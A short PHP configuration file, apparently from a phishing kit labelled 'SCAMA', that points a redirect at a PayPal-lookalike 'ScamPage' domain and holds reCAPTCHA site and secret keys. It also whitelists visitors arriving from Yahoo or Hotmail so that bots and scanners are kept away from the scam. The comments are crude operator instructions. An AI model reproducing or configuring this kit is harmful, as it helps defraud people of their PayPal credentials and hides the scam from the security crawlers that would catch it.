<?php
// --> #SCAMA Redirect Dont use any ather Redirect =D    ###
$scamaurl = 'https://www.paypal-safety.com/Home/'; // Put Here your ScamPage URL Fucking BRO

$captcha_site_key = "6Lc8yskUAAAAAPENv-0A9a8sPoTAssag4DSXjge6";

$captcha_secret_key = "6Lc8yskUAAAAAGx625DjjkcAR8lLaHMhpCTkLZmU";

$allowed_referers =array("yahoo","hotmail","other");
// you can allow vistors only which come fom hotmail or yahoo only 
// to fuck any bot want to access athe scam and you can add more easy 
$show_captchaa = "yes";
?>